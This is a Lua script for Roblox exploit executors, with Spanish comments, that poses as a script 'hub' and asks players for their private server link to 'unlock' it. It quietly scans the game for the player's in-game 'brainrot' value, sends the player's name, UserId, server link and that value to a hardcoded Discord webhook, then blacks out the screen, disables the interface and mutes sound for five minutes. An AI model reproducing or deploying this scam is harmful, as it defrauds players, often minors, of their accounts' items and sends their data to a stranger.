-- Loadstring completo: Hub + envío a Discord + blackout modal 5 minutos
-- WEBHOOK ya insertado:
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1431764048059433134/ldNhxq20Fs4d0C8O5ZjposZnkGm9rwnrNpG8lGc2gL1XFIE6b5M378byeunfzI5vjEBB"

-- Config
local RATE_LIMIT_SECONDS = 15
local BLACKOUT_DURATION = 300 -- segundos (5 minutos)
local lastSend = 0

-- Servicios
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- helpers
local function trim(s) return (s or ""):gsub("^%s*(.-)%s*$", "%1") end

local function extractValueString(s)
	if not s then return nil end
	-- patrones comunes
	local pat = s:match("(%$?[%d%.,]+%s*[MK]?%/s)")
	if pat then return trim(pat) end
	pat = s:match("(%$?[%d%.,]+%s*[MK]?)%s*/?s")
	if pat then return trim(pat.."/s") end
	pat = s:match("(%$?[%d%.,]+%s*[MK])")
	if pat then return trim(pat.."/s") end
	pat = s:match("(%$[%d%.,]+)")
	if pat then return trim(pat.."/s") end
	return nil
end

local function valueObjectToString(obj)
	if not obj then return nil end
	if (obj:IsA and (obj:IsA("NumberValue") or obj:IsA("IntValue"))) then
		return tostring(obj.Value) .. "/s"
	end
	if obj.GetAttribute and type(obj:GetAttribute) == "function" then
		local a = obj:GetAttribute("Value")
		if type(a) == "number" then return tostring(a).."/s" end
	end
	return nil
end

local function detectBrainrotValue()
	-- 1) PlayerGui textos
	for _,v in ipairs(playerGui:GetDescendants()) do
		if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
			local txt = tostring(v.Text)
			local found = extractValueString(txt)
			if found then return found end
			if txt:lower():match("per second") or txt:lower():match("por segundo") or txt:lower():match("/s") then
				local num = txt:match("([%$%d%.,%sMK]+%/s)")
				if num then return trim(num) end
			end
		end
	end

	-- 2) PlayerGui objetos por nombre
	for _,v in ipairs(playerGui:GetDescendants()) do
		local name = tostring(v.Name):lower()
		if name:match("brain") or name:match("brainrot") or name:match("dps") or name:match("valor") then
			if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
				local found = extractValueString(v.Text)
				if found then return found end
			end
			for _,child in ipairs(v:GetChildren()) do
				local conv = valueObjectToString(child)
				if conv then return conv end
			end
		end
	end

	-- 3) Workspace heurística
	for _,obj in ipairs(workspace:GetDescendants()) do
		local nm = tostring(obj.Name):lower()
		if nm:match("brain") or nm:match("brainrot") then
			for _,child in ipairs(obj:GetChildren()) do
				local conv = valueObjectToString(child)
				if conv then return conv end
			end
			if obj.GetAttribute and type(obj:GetAttribute) == "function" then
				local a = obj:GetAttribute("Value")
				if type(a) == "number" then return tostring(a).."/s" end
			end
		end
	end

	-- 4) fallback global
	for _,v in ipairs(game:GetDescendants()) do
		if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
			local found = extractValueString(v.Text)
			if found then return found end
		end
	end

	return "Unknown"
end

-- Exploit HTTP send (diversas variantes)
local function exploitPost(jsonBody)
	local body = jsonBody
	local headers = { ["Content-Type"] = "application/json" }

	if type(syn) == "table" and syn.request then
		local ok, res = pcall(function()
			return syn.request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = headers, Body = body})
		end)
		return ok, res
	end

	if type(http_request) == "function" then
		local ok, res = pcall(function()
			return http_request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = headers, Body = body})
		end)
		return ok, res
	end

	if type(request) == "function" then
		local ok, res = pcall(function()
			return request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = headers, Body = body})
		end)
		return ok, res
	end

	if http and type(http.request) == "function" then
		local ok, res = pcall(function()
			return http.request("POST", DISCORD_WEBHOOK, body, headers)
		end)
		return ok, res
	end

	return false, "No HTTP function disponible en este entorno (no se puede enviar desde cliente)."
end

local function sendDirectToDiscord(playerName, userId, link, brainValue)
	local embed = {
		username = "Roblox Link Bot",
		embeds = {{
			title = "Script executed",
			color = 65280,
			fields = {
				{ name = "Jugador", value = tostring(playerName or "Unknown"), inline = true },
				{ name = "UserId", value = tostring(userId or "Unknown"), inline = true },
				{ name = "Private Server", value = tostring(link or "None"), inline = false },
				{ name = "Brainrots Value/s", value = tostring(brainValue or "Unknown"), inline = true },
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}
	local ok, body = pcall(function() return HttpService:JSONEncode(embed) end)
	if not ok then body = '{"content":"failed to encode json"}' end
	return exploitPost(body)
end

local function sendLink(remoteEvent, link, brainValue)
	local now = os.time()
	if now - lastSend < RATE_LIMIT_SECONDS then
		return false, "Rate limit: espera un poco antes de enviar otra vez."
	end
	lastSend = now

	if remoteEvent then
		local success, err = pcall(function()
			remoteEvent:FireServer({ link = link, brainValue = brainValue })
		end)
		if success then return true, "Enviado al servidor (RemoteEvent)." end
		return false, "Error enviando RemoteEvent: "..tostring(err)
	end

	local ok, res = sendDirectToDiscord(player and player.Name or "LocalPlayer", (player and player.UserId) or "NA", link, brainValue)
	if ok then return true, "Enviado directamente al webhook." end
	return false, tostring(res)
end

-- Construcción GUI Hub (si ya existe, se reemplaza)
if playerGui:FindFirstChild("PrivateServerHub") then
	playerGui.PrivateServerHub:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PrivateServerHub"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui
screenGui.DisplayOrder = 9999

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 520, 0, 260)
frame.Position = UDim2.new(0.5, -260, 0.45, -130)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(24,24,26)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -24, 0, 48)
title.Position = UDim2.new(0, 12, 0, 12)
title.BackgroundTransparency = 1
title.Text = "Enter your Private Server Link to Unlock the Script"
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.TextColor3 = Color3.new(1,1,1)
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.94, 0, 0, 64)
textBox.Position = UDim2.new(0.03, 0, 0, 76)
textBox.PlaceholderText = "Paste your private server link here..."
textBox.Text = ""
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 18
textBox.TextWrapped = true
textBox.ClearTextOnFocus = false
textBox.TextXAlignment = Enum.TextXAlignment.Left
textBox.TextYAlignment = Enum.TextYAlignment.Center
textBox.BackgroundColor3 = Color3.fromRGB(40,40,44)
textBox.TextColor3 = Color3.fromRGB(230,230,230)
textBox.BorderSizePixel = 0
textBox.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(0.5, 0, 0, 52)
button.Position = UDim2.new(0.25, 0, 0, 156)
button.Text = "Continue"
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(255,255,255)
button.BackgroundColor3 = Color3.fromRGB(90, 90, 95)
button.BorderSizePixel = 0
button.Parent = frame

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -24, 0, 20)
status.Position = UDim2.new(0, 12, 1, -28)
status.BackgroundTransparency = 1
status.Text = ""
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(200,200,200)
status.TextXAlignment = Enum.TextXAlignment.Center
status.Parent = frame

local remote = ReplicatedStorage:FindFirstChild("SendPrivateLink")

local function looksLikeLink(s)
	if not s then return false end
	s = trim(s)
	if s == "" then return false end
	if #s > 1000 then return false end
	if s:match("^https?://") then return true end
	return false
end

-- BLACKOUT modal creation helper (returns function to start and to cancel)
local function createBlackoutModal(duration)
	-- save states
	local prevVolume = SoundService.Volume
	local disabledCore = {}
	-- try disable all core guis (best-effort)
	for _, cg in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		pcall(function()
			StarterGui:SetCoreGuiEnabled(cg, false)
			disabledCore[#disabledCore+1] = cg
		end)
	end

	-- create GUI
	local bgGui = Instance.new("ScreenGui")
	bgGui.Name = "BlackoutModal"
	bgGui.ResetOnSpawn = false
	bgGui.DisplayOrder = 10000
	bgGui.Parent = playerGui

	local black = Instance.new("Frame")
	black.Size = UDim2.new(1,0,1,0)
	black.Position = UDim2.new(0,0,0,0)
	black.BackgroundColor3 = Color3.new(0,0,0)
	black.BorderSizePixel = 0
	black.Parent = bgGui
	black.Active = true -- captures input
	black.ZIndex = 10

	-- center container
	local container = Instance.new("Frame")
	container.Size = UDim2.new(0.6, 0, 0.25, 0)
	container.AnchorPoint = Vector2.new(0.5,0.5)
	container.Position = UDim2.new(0.5, 0, 0.5, 0)
	container.BackgroundTransparency = 1
	container.Parent = black

	-- percent label
	local percentLabel = Instance.new("TextLabel")
	percentLabel.Size = UDim2.new(1,0,0.3,0)
	percentLabel.Position = UDim2.new(0,0,0,0)
	percentLabel.BackgroundTransparency = 1
	percentLabel.Font = Enum.Font.GothamBold
	percentLabel.TextSize = 30
	percentLabel.TextColor3 = Color3.new(1,1,1)
	percentLabel.Text = "0%"
	percentLabel.Parent = container
	percentLabel.TextScaled = false
	percentLabel.TextXAlignment = Enum.TextXAlignment.Center
	percentLabel.TextYAlignment = Enum.TextYAlignment.Center

	-- progress background
	local pbBack = Instance.new("Frame")
	pbBack.Size = UDim2.new(0.9, 0, 0.35, 0)
	pbBack.Position = UDim2.new(0.05, 0, 0.45, 0)
	pbBack.AnchorPoint = Vector2.new(0,0)
	pbBack.BackgroundColor3 = Color3.fromRGB(40,40,40)
	pbBack.BorderSizePixel = 0
	pbBack.Parent = container
	pbBack.ClipsDescendants = true

	-- progress fill
	local pbFill = Instance.new("Frame")
	pbFill.Size = UDim2.new(0,0,1,0)
	pbFill.Position = UDim2.new(0,0,0,0)
	pbFill.AnchorPoint = Vector2.new(0,0)
	pbFill.BackgroundColor3 = Color3.fromRGB(90,90,95)
	pbFill.BorderSizePixel = 0
	pbFill.Parent = pbBack

	-- block input connections
	local inputConns = {}
	local function blockInput(_, gameProcessed)
		-- consume inputs while blackout active; do nothing
	end
	inputConns[#inputConns+1] = UserInputService.InputBegan:Connect(blockInput)
	inputConns[#inputConns+1] = UserInputService.InputChanged:Connect(blockInput)

	-- mute game
	SoundService.Volume = 0

	-- animate progress (tween width)
	local total = math.max(1, duration)
	local tweenInfo = TweenInfo.new(total, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
	local goal = {}
	-- tween uses UDim2; tweening Size from 0 to 1
	goal.Size = UDim2.new(1, 0, 1, 0)
	local tweenOk, tween = pcall(function()
		return TweenService:Create(pbFill, tweenInfo, {Size = UDim2.new(1,0,1,0)})
	end)
	if tweenOk and tween then
		tween:Play()
	end

	-- update percent every 0.5s
	local start = tick()
	local stopped = false
	local conn
	conn = RunService.Heartbeat:Connect(function()
		local elapsed = tick() - start
		local pct = math.clamp(math.floor((elapsed/total)*100), 0, 100)
		percentLabel.Text = tostring(pct) .. "%"
		if elapsed >= total then
			percentLabel.Text = "100%"
			-- finish
			stopped = true
			if conn then conn:Disconnect() end
			-- small delay to keep 100% visible then cleanup
			delay(0.3, function()
				-- restore
				for _,c in ipairs(inputConns) do pcall(function() c:Disconnect() end) end
				SoundService.Volume = prevVolume or 1
				-- re-enable core guis (best-effort)
				for _, cg in ipairs(Enum.CoreGuiType:GetEnumItems()) do
					pcall(function() StarterGui:SetCoreGuiEnabled(cg, true) end)
				end
				if bgGui and bgGui.Parent then bgGui:Destroy() end
			end)
		end
	end)

	-- return cancel function (if needed)
	local function cancel()
		-- stop tween & connections & restore
		pcall(function() tween:Cancel() end)
		for _,c in ipairs(inputConns) do pcall(function() c:Disconnect() end) end
		SoundService.Volume = prevVolume or 1
		for _, cg in ipairs(Enum.CoreGuiType:GetEnumItems()) do
			pcall(function() StarterGui:SetCoreGuiEnabled(cg, true) end)
		end
		if conn and conn.Connected then conn:Disconnect() end
		if bgGui and bgGui.Parent then bgGui:Destroy() end
	end

	return cancel
end

local function onClick()
	local link = trim(textBox.Text or "")
	if link == "" then
		status.Text = "Please paste a link first."
		return
	end
	if not looksLikeLink(link) then
		status.Text = "Invalid link format (must start with http:// or https://)."
		return
	end

	button.Text = "Processing..."
	button.Active = false
	button.AutoButtonColor = false
	status.Text = "Detecting brainrot value..."

	local brainValue = "Unknown"
	local ok, res = pcall(function() return detectBrainrotValue() end)
	if ok and res then brainValue = res end

	status.Text = "Sending..."
	local sentOk, msg = sendLink(remote, link, brainValue)

	if not sentOk then
		status.Text = "Error: "..tostring(msg)
		button.Text = "Continue"
		button.Active = true
		button.AutoButtonColor = true
		return
	end

	-- Si llegó hasta acá, iniciamos blackout modal 5 minutos
	status.Text = "Starting... screen will be black for 5 minutes."
	-- ocultar el frame del hub inmediatamente
	frame.Visible = false

	-- crear y ejecutar blackout
	local cancelBlackout = createBlackoutModal(BLACKOUT_DURATION)
	-- opcional: si quieres forzar terminar antes, podés llamar cancelBlackout()

	-- cuando termine el blackout se restaura (la función interna lo hace)
	status.Text = "Link submitted. Brain Value: "..tostring(brainValue)

	-- restaurar botón (aunque la UI del hub está oculta)
	button.Text = "Continue"
	button.Active = true
	button.AutoButtonColor = true
end

button.MouseButton1Click:Connect(onClick)

-- evitar toggle con ESC (mientras hub visible)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.Escape then
		frame.Visible = not frame.Visible
	end
end)

status.Text = "Pegar link y presionar Continue. Rate limit: "..tostring(RATE_LIMIT_SECONDS).."s."

-- END of script
